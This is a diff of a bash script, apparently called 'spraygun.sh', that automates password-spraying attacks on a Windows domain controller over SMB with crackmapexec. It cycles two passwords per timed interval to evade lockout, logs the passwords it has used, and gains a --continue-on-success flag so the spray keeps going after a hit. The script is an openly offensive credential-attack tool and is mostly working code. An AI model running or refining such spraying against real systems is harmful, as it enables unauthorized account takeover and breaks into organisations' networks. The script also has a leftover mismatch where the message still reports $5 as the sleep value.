@@ -1,5 +1,7 @@
 #!/bin/bash
 
+#usage : ./spraygun.sh dc-ip userlist.txt passwords.txt sleep-in-mins (2x per sleep) 
+
 #script to auto-spray with cme
 
 #add if loop to check for crackmapexec new (bane or 6.0)
@@ -7,8 +9,9 @@
 # $1 - dc-ip
 # $2 - user list
 # $3 - password list
-# $4 - outlog file (not yet)
-# $5 - sleep timer
+# $4 - sleep timer
+# $5 - outlog file (not yet)
+
 
 newest=6
 
@@ -46,7 +49,7 @@ sleep 10
 #<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 alias crackmapexec="poetry run crackmapexec"
-sleep-timer="sleep $5m"
+sleep-timer="sleep $4m"
 echo "sleep set to ' $5 'mins.  Edit script to change it"
 
 #<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
@@ -65,7 +68,7 @@ while [ $count -gt 0 ]; do
 	
 	for pass in $(cat tmp.txt | head -2); do
 		
-		crackmapexec smb $1 -u $2 -p $pass --log /home/kali/Documents/sprays/spraygun.txt
+		crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log /home/kali/Documents/sprays/spraygun.txt
 		echo $pass > /home/kali/Documents/sprays/used-passwords.txt
 
 		sleep 10
